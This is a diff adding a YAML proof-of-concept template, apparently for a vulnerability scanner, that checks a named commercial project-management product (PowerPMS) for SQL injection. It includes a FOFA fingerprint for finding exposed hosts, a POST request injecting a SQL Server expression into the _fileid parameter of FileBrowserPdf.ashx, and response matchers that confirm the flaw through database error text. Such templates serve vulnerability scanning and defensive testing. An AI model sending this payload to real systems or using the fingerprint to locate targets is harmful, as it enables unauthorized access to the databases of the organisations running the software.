@@ -1,0 +1,21 @@
+id: poc-yaml-powerpms-filebrowserpdf-ashx-sqli
+info:
+  name: 普华 PowerPMS FileBrowserPdf.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: powerpms
+  fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /PowerPlat/Control/FileBrowserPdf.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _fileid=1'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
+  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\":\") &&\ncontains(body,\"\
+    PowerPMDB/SqlServer\") &&\ncontains(body,\"0x\" + t2) &&\nmatches(body,\"转换成数据类型(.*?)时失败\"\
+    ) &&\nmatches(body,\"在将(.*?)值\") &&\n!contains(body,\"<\")\n"
+transport: http
